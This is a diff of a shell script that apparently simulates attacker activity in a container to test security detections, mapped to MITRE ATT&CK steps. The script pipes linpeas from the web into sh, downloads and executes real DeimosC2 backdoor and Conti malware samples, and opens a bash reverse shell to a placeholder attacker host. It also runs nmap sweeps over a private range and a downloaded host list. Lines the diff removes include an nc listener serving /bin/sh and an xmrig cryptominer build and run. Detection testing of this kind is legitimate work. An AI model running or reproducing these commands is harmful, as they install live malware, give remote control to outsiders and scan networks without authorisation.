@@ -1,6 +1,24 @@
 #!/bin/sh
 # Configured for a Busybox container written by hreed@paloaltonetworks.com
 # APS shell enviorment > standard tools 
+#Update Apline package Manager
+apk update
+apk upgrade
+# network scanning
+echo "[+] Adding Network Scanning tools" 
+apk add nmap 
+apk add tor 
+apk add socat 
+# script execution 
+echo "[+] Adding script exectuion enviorments"
+apk add busybox-extras 
+apk add bash 
+# binairy compilers 
+echo "[+] Adding Linux Binary Compilers"
+apk add git build-base cmake libuv-dev openssl-dev hwloc-dev
+apk add --no-cache gcc g++
+apk add --no-cache clang llvm
+
 
 # SENARIO 1 --- Script Activity / Linux Enumeration 
 # Outcomes - detect suspicous script activity 
@@ -11,8 +29,8 @@ wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O e
 
 # Step 2: Make the Enumeration Script Executable
 echo "[+] Making the enumeration script executable..."
-chmod 700 enum_script.sh
-sleep 10
+chmod +x enum_script.sh
+sleep 3
 
 # Step 3: Run the Enumeration Script in a Docker Container
 echo "[+] Executing enumeration script."
@@ -22,6 +40,7 @@ sleep 3
 # Step 3 More Smart Enumerations 
 echo "[+] Download linpeas for fun"
 wget -qO- https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh
+sleep 3 
 
 # SENARIO 2 --- Local Malware 
 echo "Senario 2 - Malware Protection - Wildfire Analysis"
@@ -41,14 +60,10 @@ chmod 700 /loader.sh
 echo "[+] Creating more shadow copies" 
 cat 05e9fe8e9e693cb073ba82096c291145c953ca3a3f8b3974f9c66d15c1a3a11d.elf.x86_64 > /bin/nonsus.sh
 chmod 700 /bin/nonsus.sh 
-sleep 10 
+sleep 3 
 
 # make executaable
 echo "[+] Making unixbackdoor executable"
-chmod 700 
-# execute 
-#echo "[+] Executing the Unix BackDoor"
-05e9fe8e9e693cb073ba82096c291145c953ca3a3f8b3974f9c66d15c1a3a11d.elf.x86_64 || true
 
 # Step 2 - Conti
 echo "[+] Downloading Conti-C2 malware"
@@ -63,12 +78,12 @@ sleep 3
 # Step 3 - c2 
 echo "[+] downloading C2 client " 
 wget https://raw.githubusercontent.com/timb-machine/linux-malware/refs/heads/main/malware/binaries/Unix.Backdoor.DeimosC2/05e9fe8e9e693cb073ba82096c291145c953ca3a3f8b3974f9c66d15c1a3a11d.elf.x86_64 -O c2.sh
-sleep 5
+sleep 3
 
 # Make Executable 
-echo "[+] Changing C2 file permissions: executable" 
+echo "[+] Changing C2 Client file permissions: executable" 
 chmod 700 c2.sh
-sleep 7
+sleep 
 
 # Exectuion of Malware and Handlening 
 echo "[+] callin malware executables"
@@ -77,67 +92,15 @@ conti.sh || true
 c2.sh || true 
 
 # Senario In Progress 
-# Downloading and executing security toolsets 
-apk update 
-apk add --no-cache gcc g++
-apk add --no-cache clang llvm
-
-## donload address list 
-wget https://gist.githubusercontent.com/scrubmx/c02474b2b80fbca721be2fa2d9f203c8/raw/dd0d4b55c4e5c0670ffc182085517dbdad81642a/hosts.csv -0 url2.txt 
-
-### install nmap  
-apk update
-apk add nmap 
-apk add tor 
-apk add socat 
-apk add busybox-extras 
-apk add bash 
-apk add nc 
-apk add git build-base cmake libuv-dev openssl-dev hwloc-dev
 
 
-# SENARIO -- Reverse Webshell TOr
-## Make Hidden services 
-#mkdir -p /etc/tor/hidden_service
-#echo "HiddenServiceDir /etc/tor/hidden_service
-#HiddenServicePort 80 127.0.0.1:8080" > /etc/tor/torrc
-
-# Start Hidden to Service 
-tor & 
-
-# verify the hostname is correct 
-sleep 10 
-#cat /etc/tor/hidden_service/hostname
-
-### Execute nmap 
-echo "[+] starting scanning processs"
-nmap -p- 10.0.0.0/16 > localhost.txt
-nmap -iL url2.txt  > results.txt
-
-### Tor Listener
-nc -lvnp 8080 -e /bin/sh
-
-# Cryptominer Exectuion 
-git clone https://github.com/xmrig/xmrig
-cd xmrig
-mkdir build
-cmake 
-make
-
-### shart cryptominer 
-./xmrig -o pool.supportxmr.com:3333 -u 44XABCYourWalletAddressHere123 -p x
-
-## exit the cryto miner binary
-
-cd /
 # MITRE ATT&CK TTP Demonstration Script
-
 # === Initial Access and Execution ===
 echo "[*] Attempting SSH Access..."
 ssh user@localhost || echo "[!] SSH failed - Continuing..."
 
 echo "[*] Creating reverse shell..."
-sh -i >& /dev/tcp/[ATTACKER_IP]/[PORT] 0>&1 || echo "[!] Reverse shell failed - Continuing..."
+bash -i >& /dev/tcp/[ATTACKER_IP]/[PORT] 0>&1 || echo "[!] Reverse shell failed - Continuing..."
 
 # === Persistence ===
 echo "[*] Adding a cron job for persistence..."
@@ -211,3 +174,22 @@ tar -cf sensitive_data.tar /important_dir && openssl enc -aes-256-cbc -salt -in 
 
 echo "[*] Script execution completed. This simulated MITRE ATT&CK techniques in a controlled manner."
 
+### Network Scanning Local 
+### Nmap > Local Scanning > Recon List 
+echo "[+] starting scanning processs"
+nmap -p- 10.0.0.0/16 > localhost.txt
+
+### Network Scanning ## donload address list 
+wget https://gist.githubusercontent.com/scrubmx/c02474b2b80fbca721be2fa2d9f203c8/raw/dd0d4b55c4e5c0670ffc182085517dbdad81642a/hosts.csv -0 url2.txt 
+nmap -iL url2.txt
+
+### TOR Scenario 
+## Make Hidden services 
+#mkdir -p /etc/tor/hidden_service
+#echo "HiddenServiceDir /etc/tor/hidden_service
+#HiddenServicePort 80 127.0.0.1:8080" > /etc/tor/torrc
+# Start Hidden to Service 
+#tor & 
+# verify the hostname is correct 
+#sleep 10 
+#cat /etc/tor/hidden_service/hostname
